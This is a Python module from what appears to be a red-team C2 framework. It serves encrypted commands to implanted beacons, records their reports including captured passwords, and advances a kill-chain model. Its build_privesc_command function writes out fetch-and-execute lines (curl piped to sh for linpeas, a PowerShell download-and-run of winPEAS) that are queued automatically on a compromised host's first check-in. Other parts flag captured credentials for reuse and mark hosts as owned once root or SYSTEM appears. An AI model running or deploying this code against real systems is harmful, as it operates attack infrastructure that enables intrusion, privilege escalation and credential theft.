"""Beacon command/result service for the C2 server.

Owns the poll (``send_command``) and report (``receive_result``)
pipelines: kill-chain check-in side effects, command queue serving,
result validation, CSV logging, engagement/conditional hooks and the
bidirectional knowledge ingest. The Flask routes in ``lazyc2.py`` stay
thin adapters so the test monkeypatch surface
(``lazyc2.send_command`` / ``lazyc2.receive_result``) is preserved.

Contracts:
    - :class:`BeaconRuntime` carries every lazyc2 module dependency;
      nothing here imports ``lazyc2`` (no cycles).
    - ``first_checkin`` advances the kill-chain once per new beacon and
      queues auto-privesc/discover when configured.
    - ``receive_result`` validates, logs, records and fans out one
      beacon report without touching the global Flask app.
"""

from __future__ import annotations

import csv
import hashlib
import json
import logging
import os
import shutil
import threading
from collections.abc import Callable
from dataclasses import dataclass
from typing import Any

from flask import Response, jsonify, request

from modules.security_sanitizers import sanitize_client_id

_log = logging.getLogger(__name__)

LINPEAS_CANDIDATES = (
    "/usr/share/peass/linpeas/linpeas.sh",
    "external/.exploit/privilege-escalation-awesome-scripts-suite/linPEAS/linpeas.sh",
    "external/linpeas.sh",
)
WINPEAS_CANDIDATES = (
    "/usr/share/peass/winpeas/winPEASx64.exe",
    "/usr/share/peass/winpeas/winPEASx86.exe",
    "/usr/share/peass/winpeas/winPEASany.exe",
    "external/.exploit/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASx64.exe",
    "external/winPEASx64.exe",
)

REQUIRED_REPORT_KEYS = (
    "output",
    "command",
    "client",
    "pid",
    "hostname",
    "ips",
    "user",
    "discovered_ips",
    "result_portscan",
    "result_pwd",
)


@dataclass(frozen=True)
class BeaconRuntime:
    """Dependency bundle binding one service call to lazyc2 module state.

    Attributes:
        config: Active LazyConfig instance.
        base_dir: Repository root used for skills/modules sys.path setup.
        sessions_dir: Tenant-switchable ``sessions`` directory.
        allowed_directory: Beacon working directory (queue + result logs).
        connected_clients: Mutable set of connected beacon ids.
        bsb_clients: Mutable set of BlackSandBeacon beacon ids.
        results: Mutable dict of the latest result per beacon.
        pending_commands: Mutable dict of one-shot in-memory commands.
        store: On-disk beacon storage contract.
        debug_log: Lazyc2 debug logger.
        now_fn: ISO timestamp provider.
        signature_guard: HMAC beacon guard callable.
        decrypt_payload: AES payload decryptor.
        current_aes_key: Live master key provider.
        encrypt_for: Per-client command encryptor.
        sanitize_id: Client-id sanitizer.
        sanitize_csv_field: CSV field sanitizer.
    """

    config: Any
    base_dir: str
    sessions_dir: str
    allowed_directory: str
    connected_clients: set
    bsb_clients: set
    results: dict
    pending_commands: dict
    store: Any
    debug_log: Any
    now_fn: Callable[[], str]
    signature_guard: Callable[[], Any]
    decrypt_payload: Callable[..., Any]
    current_aes_key: Callable[[], Any]
    encrypt_for: Callable[[str, bytes], str]
    sanitize_id: Callable[[str], str]
    sanitize_csv_field: Callable[..., str]


def extract_first_ip(raw: str) -> str:
    """Extract the first valid IPv4 address from a comma-separated string."""
    import ipaddress

    for candidate in str(raw).split(","):
        clean = candidate.strip().strip("[]'\" ")
        try:
            ipaddress.IPv4Address(clean)
            return clean
        except Exception:
            continue
    return ""


def looks_like_credential(value: str) -> bool:
    """Check if a string looks like a captured credential."""
    candidate = str(value).strip()
    if not candidate:
        return False
    if len(candidate) < 6:
        return False
    has_user_pass = ":" in candidate and 2 <= len(candidate.split(":", 1)[0]) <= 128
    has_ntlm = "$" in candidate and len(candidate) >= 32
    has_hash = "$" in candidate and "$:" in candidate
    is_multiline = "\n" in candidate and has_user_pass
    is_path_only = (
        candidate.startswith("/") or candidate.startswith("\\") or candidate.startswith("C:")
    )
    if is_path_only and not has_user_pass:
        return False
    return has_user_pass or has_ntlm or has_hash or is_multiline


def normalise_platform(raw_platform: str) -> str:
    """Normalise a beacon platform string to linux/windows."""
    lowered = raw_platform.lower()
    if "linux" in lowered:
        return "linux"
    if "windows" in lowered or "win" in lowered:
        return "windows"
    return lowered


def _try_copy_privesc_tool(platform: str, sessions_dir: str) -> str | None:
    """Copy linpeas/winpeas to sessions/ from known local paths.

    Returns the destination filename when successful, None otherwise.
    """
    candidates = LINPEAS_CANDIDATES if platform == "linux" else WINPEAS_CANDIDATES
    for src in candidates:
        if os.path.isfile(src):
            dest = os.path.join(sessions_dir, os.path.basename(src))
            if not os.path.exists(dest):
                try:
                    shutil.copy2(src, dest)
                except OSError:
                    continue
            return os.path.basename(src)
    return None


def build_privesc_command(platform: str, config: Any, sessions_dir: str) -> str | None:
    """Build the download+execute command for linpeas (Linux) or winpeas (Windows).

    Tries to copy the tool locally first, then constructs a command that
    downloads from the C2 server with a public GitHub fallback.
    """
    lhost = str(getattr(config, "lhost", "127.0.0.1"))
    c2_port = str(getattr(config, "c2_port", "443"))
    base = f"https://{lhost}:{c2_port}"

    if platform == "linux":
        _try_copy_privesc_tool("linux", sessions_dir)
        return (
            f"(curl -sk {base}/s/linpeas.sh 2>/dev/null || "
            f"curl -sSL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh 2>/dev/null) "
            f"| sh 2>&1"
        )

    if platform == "windows":
        fname = _try_copy_privesc_tool("windows", sessions_dir) or "winPEASx64.exe"
        return (
            f"$wp=Join-Path $env:TEMP '{fname}'; "
            f"try{{iwr -Uri '{base}/s/{fname}' -OutFile $wp 2>$null}}catch{{}}; "
            f"if(Test-Path $wp){{& $wp 2>&1}}"
        )

    return None


def _queue_commands(rt: BeaconRuntime, client_id: str, commands: list[str]) -> bool:
    """Append commands to the beacon queue, preserving existing entries."""
    try:
        queue_path = rt.store.queue_path(client_id)
        existing: list[str] = []
        if os.path.isfile(queue_path):
            with open(queue_path) as queue_file:
                existing = json.load(queue_file)
        for command in commands:
            if command not in existing:
                existing.append(command)
        return rt.store.save_queue(client_id, existing)
    except Exception as exc:
        logging.debug("queue append failed: %s", exc)
        return False


def first_checkin(rt: BeaconRuntime, client_id: str) -> None:
    """Advance the kill-chain on a beacon's first poll and queue auto-privesc.

    Args:
        rt: Active beacon runtime.
        client_id: Raw beacon client id.
    """
    try:
        records = rt.store.read_records(client_id)
        platform = "linux"
        primary_ip = ""
        if records:
            last = records[-1]
            platform = str(last.get("client", "linux")).lower()
            if "win" in platform or "windows" in platform:
                platform = "windows"
            else:
                platform = "linux"
            raw_ips = str(last.get("ips", ""))
            primary_ip = raw_ips.split(",")[0].strip().strip("[]'\"") if raw_ips else ""
        if not primary_ip:
            primary_ip = str(client_id)
        from modules.world_model import HostState as HS
        from modules.world_model import get_world_model as get_wm

        wm = get_wm()
        wm.advance_host(primary_ip, HS.EXPLOITED)
        wm.add_note(primary_ip, f"Foothold via beacon {client_id}")
        from modules.killchain import KillChain as KC

        KC.advance_phase("exploit", host=primary_ip)
        KC.advance_phase("privesc", host=primary_ip)
        logging.info("[killchain] Phase advanced to privesc via beacon GET %s", client_id)
        if bool(getattr(rt.config, "auto_privesc_on_checkin", False)):
            privesc_cmd = build_privesc_command(platform, rt.config, rt.sessions_dir)
            if privesc_cmd:
                _queue_commands(rt, client_id, [privesc_cmd])
                logging.info(
                    "[privesc] Queued %s for %s on first GET",
                    "linpeas" if platform == "linux" else "winpeas",
                    client_id,
                )
    except Exception as exc:
        logging.debug("[killchain] GET advance failed: %s", exc)


def send_command(rt: BeaconRuntime, client_id: str) -> Response:
    """Serve the next queued command to a beacon (the ``/command/`` handler).

    Args:
        rt: Active beacon runtime.
        client_id: Beacon client id from the poll path.

    Returns:
        The encrypted-command response.
    """
    signature_error = rt.signature_guard()
    if signature_error is not None:
        return signature_error
    was_new = client_id not in rt.connected_clients
    rt.connected_clients.add(client_id)

    if was_new:
        first_checkin(rt, client_id)

    if client_id in rt.pending_commands:
        command = rt.pending_commands.pop(client_id)
        encrypted_command = rt.encrypt_for(client_id, command.encode())
        return Response(encrypted_command)

    try:
        rt.store.queue_path(client_id)
    except Exception:
        logging.info("Rejected invalid client_id in send_command")
        encrypted_response = rt.encrypt_for(client_id, b"")
        return Response(encrypted_response, mimetype="application/octet-stream")

    queue = rt.store.load_queue(client_id)
    if queue:
        command = queue.pop(0)
        if rt.store.save_queue(client_id, queue):
            encrypted_command = rt.encrypt_for(client_id, command.encode())
            return Response(encrypted_command)

    logging.info(f"No command for client {client_id}")
    encrypted_response = rt.encrypt_for(client_id, b"")
    return Response(encrypted_response, mimetype="application/octet-stream")


def publish_shell_engagement(
    rt: BeaconRuntime,
    client_id: str,
    primary_ip: str,
    hostname: str,
    user: str,
    platform: str,
) -> None:
    """Publish the SHELL_OBTAINED engagement hook in a background thread.

    Fires once per client (idempotent upstream via the seen-beacons
    cache) and never delays the beacon response path.
    """
    modules_path = os.path.join(rt.base_dir, "modules")

    def _publish() -> None:
        try:
            import sys

            if modules_path not in sys.path:
                sys.path.insert(0, modules_path)
            from engagement_hooks import publish_shell_obtained

            publish_shell_obtained(
                client_id=client_id,
                primary_ip=primary_ip,
                hostname=hostname,
                user=user,
                platform=platform,
            )
            try:
                from modules.event_bus import EventCategory, LazyEvent, get_event_bus

                get_event_bus().publish(
                    LazyEvent(
                        category=EventCategory.BEACON,
                        event_type="beacon_registered",
                        source="c2",
                        payload={
                            "client_id": client_id,
                            "ip": primary_ip,
                            "hostname": hostname,
                            "user": user,
                            "platform": platform,
                        },
                        target=primary_ip,
                    )
                )
            except Exception:
                pass
        except Exception as exc:
            logging.debug(f"[engagement] publish_shell_obtained failed: {exc}")

    threading.Thread(target=_publish, daemon=True, name="engage-shell-hook").start()


def ingest_beacon_output(
    rt: BeaconRuntime,
    ips: str,
    hostname: str,
    command: str,
    output: str,
    user: str,
    raw_os: str,
) -> None:
    """Feed beacon output back into the knowledge pipeline (background).

    Writes ``sessions/<ip>/c2/<cmd_hash>/beacon.txt``, ingests into the
    FactStore, records the beacon's ground-truth OS and emits a
    BEACON_OUTPUT event. Never delays the beacon response.
    """
    skills = os.path.join(rt.base_dir, "skills")
    mods = os.path.join(rt.base_dir, "modules")

    def _ingest() -> None:
        try:
            import sys

            if skills not in sys.path:
                sys.path.insert(0, skills)
            if mods not in sys.path:
                sys.path.insert(0, mods)

            primary_ip = extract_first_ip(ips) or hostname

            cmd_slug = hashlib.sha256(command.encode()).hexdigest()[:8]
            out_dir = os.path.join(rt.sessions_dir, primary_ip, "c2", cmd_slug)
            os.makedirs(out_dir, exist_ok=True)
            beacon_file = os.path.join(out_dir, "beacon.txt")
            with open(beacon_file, "a") as beacon_handle:
                beacon_handle.write(f"# cmd: {command}\n# user: {user}\n{output}\n")

            from pathlib import Path

            from lazyown_facts import FactStore

            fact_store = FactStore()
            ingested = fact_store.ingest_text(Path(beacon_file), host_hint=primary_ip)
            if ingested:
                fact_store.save()
                logging.info(f"[c2-bidir] FactStore: {ingested} facts from beacon {primary_ip}")

            lowered_os = str(raw_os).lower()
            if "windows" in lowered_os:
                os_id, os_name = "2", "Windows"
            elif "linux" in lowered_os or "unix" in lowered_os:
                os_id, os_name = "1", "Linux"
            else:
                os_id, os_name = "4", "Unknown"

            if os_id != "4":
                _record_ground_truth_os(rt, primary_ip, os_id, os_name)

            _emit_beacon_output_event(primary_ip, command, user)
        except Exception as exc:
            logging.debug(f"[c2-bidir] ingest failed: {exc}")

    threading.Thread(target=_ingest, daemon=True, name="c2-bidir").start()


def _record_ground_truth_os(rt: BeaconRuntime, primary_ip: str, os_id: str, os_name: str) -> None:
    """Write the beacon-reported OS to sessions/os.json and the world model."""
    os_json_path = os.path.join(rt.sessions_dir, "os.json")
    try:
        os_entry = [
            {
                "id": os_id,
                "os": os_name,
                "ttl": 64 if os_id == "2" else 128,
                "state": "active",
                "source": "beacon",
            }
        ]
        with open(os_json_path, "w") as os_handle:
            json.dump(os_entry, os_handle, indent=4)
        logging.info(
            f"[c2-bidir] sessions/os.json updated: os={os_name} host={primary_ip} (beacon ground truth)"
        )
    except Exception as exc:
        logging.debug(f"[c2-bidir] os.json write error: {exc}")

    wm_path = os.path.join(rt.sessions_dir, "world_model.json")
    try:
        from modules.world_model import read_state_dict, write_state_dict

        world_model = read_state_dict(wm_path)
        hosts = world_model.setdefault("hosts", {})
        host_entry = hosts.setdefault(primary_ip, {})
        if not host_entry.get("os_hint"):
            host_entry["os_hint"] = os_name.lower()
            write_state_dict(wm_path, world_model)
            logging.info(
                f"[c2-bidir] world_model.json os_hint={os_name.lower()} host={primary_ip}"
            )
    except Exception as exc:
        logging.debug(f"[c2-bidir] world_model update error: {exc}")


def _emit_beacon_output_event(primary_ip: str, command: str, user: str) -> None:
    """Emit the BEACON_OUTPUT event through the event engine."""
    import datetime
    import uuid

    from event_engine import _append_event

    _append_event(
        {
            "id": uuid.uuid4().hex[:8],
            "timestamp": datetime.datetime.now(datetime.UTC).isoformat(),
            "type": "BEACON_OUTPUT",
            "severity": "info",
            "rule_id": "c2_beacon",
            "source": {"ip": primary_ip, "cmd": command[:80], "user": user},
            "suggest": f"New beacon output from {primary_ip}. Run facts_show(refresh=True).",
            "status": "pending",
        }
    )


def _register_hook_handlers(rt: BeaconRuntime, hook_engine: Any) -> None:
    """Register the run_command hook handlers that queue beacon commands."""
    if "run_command" in hook_engine._action_handlers:
        return

    allowed_dir = rt.allowed_directory

    def _queue_beacon_cmd(action: dict, ctx: dict) -> bool | None:
        cid = str(ctx.get("client_id", ""))
        command = str(action.get("command", ""))
        if not cid or not command:
            return None
        sanitized = sanitize_client_id(cid)
        queue_path = os.path.join(allowed_dir, f"cmd_{sanitized}.json")
        try:
            commands: list = []
            if os.path.isfile(queue_path):
                with open(queue_path) as queue_file:
                    commands = json.load(queue_file)
            commands.append(command)
            with open(queue_path, "w") as queue_file:
                json.dump(commands, queue_file)
            logging.info("[hooks] Queued beacon cmd for %s: %s", cid, command[:80])
            return True
        except Exception as exc:
            logging.warning("[hooks] Beacon queue failed: %s", exc)
            return None

    hook_engine.register_action_handler("run_command", _queue_beacon_cmd)
    hook_engine.register_action_handler("run_scan_command", _queue_beacon_cmd)


def _ingest_recon_results(
    rt: BeaconRuntime,
    hook_engine: Any,
    client_id: str,
    primary_ip: str,
    hostname: str,
    user: str,
    discovered_ips: str,
    result_portscan: str,
) -> None:
    """Ingest portscan/discovered-host results and queue follow-up scans."""
    try:
        from modules.beacon_recon import ingest_beacon_recon

        recon_stats = ingest_beacon_recon(
            primary_ip=primary_ip,
            discovered_ips=discovered_ips,
            portscan=result_portscan,
            hostname=hostname,
            user=user,
            client_id=client_id,
        )
        logging.info(
            "[beacon_recon] %s: %s",
            client_id,
            {key: recon_stats.get(key) for key in ("hosts", "services")},
        )
        for ps_host, ps_ports in (recon_stats.get("scanned") or {}).items():
            for ps_port in ps_ports:
                hook_engine.fire("service_detected", {"port": ps_port, "host": ps_host})
        recon_state = rt.store.load_recon_state(client_id)
        if recon_stats.get("discovered") and not recon_state.get("portscan_queued"):
            recon_state["portscan_queued"] = True
            rt.store.save_recon_state(client_id, recon_state)
            rt.store.enqueue(client_id, "portscan:")
            logging.info(
                "[beacon_recon] Queued portscan: for %s (%d live host(s))",
                client_id,
                len(recon_stats.get("discovered") or []),
            )
    except Exception as exc:
        logging.debug("[beacon_recon] ingest failed: %s", exc)


def _queue_first_checkin_tasks(rt: BeaconRuntime, client_id: str, platform: str) -> None:
    """Queue linpeas/winpeas and the discover sweep on first check-in."""
    commands: list[str] = []
    privesc_cmd = build_privesc_command(platform, rt.config, rt.sessions_dir)
    if privesc_cmd:
        commands.append(privesc_cmd)
        logging.info(
            "[privesc] Queued %s for %s: %.100s",
            "linpeas" if platform == "linux" else "winpeas",
            client_id,
            privesc_cmd,
        )
    recon_state = rt.store.load_recon_state(client_id)
    if not recon_state.get("discover_queued") and bool(
        getattr(rt.config, "auto_discover_on_checkin", False)
    ):
        commands.append("discover:")
        recon_state["discover_queued"] = True
        logging.info("[beacon_recon] Queued discover: for %s", client_id)
    rt.store.save_recon_state(client_id, recon_state)
    if commands:
        _queue_commands(rt, client_id, commands)


def _check_root_privileges(hook_engine: Any, hctx: dict, primary_ip: str, output: str, user: str) -> None:
    """Advance the host to OWNED and fire privesc hooks when root/System shows up."""
    try:
        output_lower = str(output).lower()
        owns = (
            str(user).lower() == "root"
            or "uid=0(root)" in output_lower
            or ("uid=0(" in output_lower and "root" in output_lower)
            or "nt authority\\system" in output_lower
            or str(user).lower() == "nt authority\\system"
        )
        if not owns:
            return
        from modules.world_model import HostState as HS
        from modules.world_model import get_world_model as get_wm

        wm = get_wm()
        wm.advance_host(primary_ip, HS.OWNED)
        wm.add_note(primary_ip, "Privilege escalation successful: root/System obtained")
        logging.info("[killchain] Beacon %s already root/System — host OWNED", hctx.get("client_id"))
        hook_engine.fire("privilege_escalated", hctx)
        hook_engine.fire("host_owned", hctx)
    except Exception:
        pass


def _suggest_credential_reuse(primary_ip: str) -> None:
    """Log credential-reuse candidates in a background thread."""
    try:
        from modules.credential_reuse import get_credential_reuse_engine
        from modules.state_manager import StateManager

        def _suggest() -> None:
            engine = get_credential_reuse_engine()
            state = StateManager()
            candidates = engine.suggest_from_state_manager(state, limit=10)
            if candidates:
                logging.info("[cred_reuse]\n%s", engine.get_summary(candidates))

        threading.Thread(target=_suggest, daemon=True).start()
    except Exception:
        pass


def run_conditional_hooks(
    rt: BeaconRuntime,
    client_id: str,
    primary_ip: str,
    hostname: str,
    user: str,
    platform: str,
    command: str,
    output: str,
    result_pwd: str,
    result_portscan: str,
    discovered_ips: str,
    was_new: bool,
) -> None:
    """Fire the operator-defined conditional-hook rules for one report.

    Args:
        rt: Active beacon runtime.
        client_id: Sanitized beacon client id.
        primary_ip: Beacon primary IP (or hostname fallback).
        hostname: Reported hostname.
        user: Reported user.
        platform: Normalised platform string.
        command: Executed command.
        output: Command output (bounded to 500 chars upstream).
        result_pwd: Captured password field.
        result_portscan: Captured portscan field.
        discovered_ips: Captured discovered-hosts field.
        was_new: True on the beacon's first report.
    """
    from modules.conditional_hooks import get_hook_engine

    hook_engine = get_hook_engine()
    hook_engine.set_placeholders(
        {
            "rhost": str(getattr(rt.config, "rhost", "")),
            "lhost": str(getattr(rt.config, "lhost", "")),
            "domain": str(getattr(rt.config, "domain", "")),
        }
    )
    _register_hook_handlers(rt, hook_engine)

    hctx = {
        "client_id": str(client_id),
        "ip": primary_ip,
        "hostname": str(hostname),
        "user": str(user),
        "platform": normalise_platform(str(platform)),
        "command": str(command),
        "output": str(output)[:500],
    }

    if was_new:
        hook_engine.fire("beacon_connected", hctx)

    try:
        from modules.world_model import HostState as HS
        from modules.world_model import get_world_model as get_wm

        wm = get_wm()
        wm.advance_host(primary_ip, HS.EXPLOITED)
        wm.add_note(primary_ip, f"Foothold: {str(user)} via {str(platform)}")
        logging.info("[world_model] Advanced %s to EXPLOITED (foothold)", primary_ip)
        from modules.killchain import KillChain as KC

        KC.advance_phase("exploit", host=primary_ip)
        logging.info("[killchain] Phase advanced to exploit via beacon %s", client_id)
        if was_new:
            KC.advance_phase("privesc", host=primary_ip)
            logging.info("[killchain] Phase advanced to privesc via beacon %s", client_id)
    except Exception as exc:
        logging.debug("[world_model] advance failed: %s", exc)

    hook_engine.fire("command_executed", hctx)

    if was_new and bool(getattr(rt.config, "auto_privesc_on_checkin", False)):
        try:
            _queue_first_checkin_tasks(rt, client_id, normalise_platform(str(platform)))
        except Exception as exc:
            logging.debug("[privesc] Queue failed: %s", exc)

    _check_root_privileges(hook_engine, hctx, primary_ip, output, user)

    if result_pwd and looks_like_credential(str(result_pwd)):
        hook_engine.fire("credential_captured", hctx)
        _suggest_credential_reuse(primary_ip)

    if result_portscan or discovered_ips:
        _ingest_recon_results(
            rt,
            hook_engine,
            client_id,
            primary_ip,
            hostname,
            user,
            discovered_ips,
            result_portscan,
        )


def receive_result(rt: BeaconRuntime, client_id: str) -> Any:
    """Receive and process one beacon report (the ``/command/`` POST handler).

    Args:
        rt: Active beacon runtime.
        client_id: Beacon client id from the poll path.

    Returns:
        The Flask response for the report.
    """
    signature_error = rt.signature_guard()
    if signature_error is not None:
        return signature_error
    try:
        logging.info(f"Receiving result from client {client_id}")
        encrypted_data = request.get_data()
        data = None
        try:
            data = json.loads(rt.decrypt_payload(encrypted_data))
        except Exception:
            data = None
        if not isinstance(data, dict):
            # BlackSandBeacon protocol: HKDF-derived key + replay envelope.
            from modules.bsb_compat import decrypt_bsb_report

            data, bsb_counter, _bsb_ts = decrypt_bsb_report(encrypted_data, rt.current_aes_key())
            rt.bsb_clients.add(str(client_id))
            logging.info(f"BSB report from {client_id} (counter={bsb_counter})")
        if client_id not in rt.connected_clients:
            rt.connected_clients.add(client_id)
            if rt.config.enable_c2_debug:
                rt.debug_log.info(f"New client connected: {client_id}")
        if not data or not all(key in data for key in REQUIRED_REPORT_KEYS):
            return jsonify({"status": "error", "message": "Invalid data format"}), 400

        output = data["output"]
        client = data["client"]
        pid = data["pid"]
        hostname = data["hostname"]
        ips = data["ips"]
        user = data["user"]
        discovered_ips = data["discovered_ips"]
        result_portscan = data["result_portscan"]
        result_pwd = data["result_pwd"]
        command = data["command"]

        if not all([command, output, client_id]):
            return jsonify({"status": "error", "message": "Required fields cannot be empty"}), 400

        if not isinstance(client_id, str):
            return jsonify({"status": "error", "message": "Invalid client_id type"}), 400

        sanitized_client_id = rt.sanitize_id(client_id)
        if not sanitized_client_id or sanitized_client_id != client_id:
            return jsonify({"status": "error", "message": "Invalid client_id format"}), 400

        try:
            allowed_directory_abs = os.path.abspath(rt.allowed_directory)
            filename = f"{sanitized_client_id}.log"
            csv_file = os.path.join(allowed_directory_abs, filename)
            csv_file_abs = os.path.abspath(csv_file)
            if not csv_file_abs.startswith(allowed_directory_abs + os.sep):
                return jsonify({"status": "error", "message": "Invalid file path"}), 403

            if not os.access(allowed_directory_abs, os.W_OK):
                return jsonify({"status": "error", "message": "Permission denied"}), 403

        except Exception:
            if rt.config.enable_c2_debug:
                rt.debug_log.info("[ERROR] Path validation error")
            return jsonify({"status": "error", "message": "Path validation error"}), 500

        try:
            file_exists = os.path.isfile(csv_file_abs)
            with open(csv_file_abs, "a", newline="") as result_handle:
                writer = csv.writer(result_handle)
                if not file_exists:
                    writer.writerow(
                        [
                            "client_id",
                            "os",
                            "pid",
                            "hostname",
                            "ips",
                            "user",
                            "discovered_ips",
                            "result_portscan",
                            "result_pwd",
                            "command",
                            "output",
                        ]
                    )

                safe_data = [
                    rt.sanitize_csv_field(sanitized_client_id),
                    rt.sanitize_csv_field(client, maxlen=100),
                    rt.sanitize_csv_field(pid, maxlen=20),
                    rt.sanitize_csv_field(hostname, maxlen=100),
                    rt.sanitize_csv_field(ips, maxlen=100),
                    rt.sanitize_csv_field(user, maxlen=50),
                    rt.sanitize_csv_field(discovered_ips, maxlen=1000),
                    rt.sanitize_csv_field(result_portscan, maxlen=1000),
                    rt.sanitize_csv_field(result_pwd, maxlen=1000),
                    rt.sanitize_csv_field(command, maxlen=500),
                    rt.sanitize_csv_field(output, maxlen=1000),
                ]
                writer.writerow(safe_data)

            record = {
                "client_id": sanitized_client_id,
                "output": output,
                "client": client,
                "pid": pid,
                "hostname": hostname,
                "ips": ips,
                "user": user,
                "discovered_ips": discovered_ips,
                "result_portscan": result_portscan,
                "result_pwd": result_pwd,
                "command": command,
                "timestamp": rt.now_fn(),
            }
            rt.results[sanitized_client_id] = record
            rt.store.append_record(record)

            logging.info(f"Received output from {sanitized_client_id}: {output[:100]} Platform: {client}")
            was_new = sanitized_client_id not in rt.connected_clients
            rt.connected_clients.add(sanitized_client_id)
            logging.info(f"Client {sanitized_client_id} registered as connected")

            try:
                publish_shell_engagement(
                    rt,
                    str(sanitized_client_id),
                    str(ips).split(",")[0].strip().strip("[]'\""),
                    str(hostname),
                    str(user),
                    str(client),
                )
            except Exception:
                pass

            try:
                primary_ip = extract_first_ip(str(ips) if ips else "") or str(hostname)
                run_conditional_hooks(
                    rt,
                    sanitized_client_id,
                    primary_ip,
                    hostname,
                    user,
                    client,
                    command,
                    output,
                    result_pwd,
                    result_portscan,
                    discovered_ips,
                    was_new,
                )
            except Exception as exc:
                logging.debug("[hooks] fire failed: %s", exc)

            try:
                ingest_beacon_output(
                    rt,
                    str(ips),
                    str(hostname),
                    str(command),
                    str(output),
                    str(user),
                    str(data.get("client", "")),
                )
            except Exception:
                pass

            return jsonify({"status": "success", "Platform": client}), 200

        except OSError:
            if rt.config.enable_c2_debug:
                rt.debug_log.info("[ERROR] File operation error")
            return jsonify({"status": "error", "message": "File operation error"}), 500

    except json.JSONDecodeError:
        if rt.config.enable_c2_debug:
            rt.debug_log.info("[ERROR] Invalid JSON received")
        return jsonify({"status": "error", "message": "Invalid JSON"}), 400
    except Exception:
        rt.debug_log.exception("Unexpected error in handler")
        return jsonify({"status": "error", "message": "Internal server error"}), 500
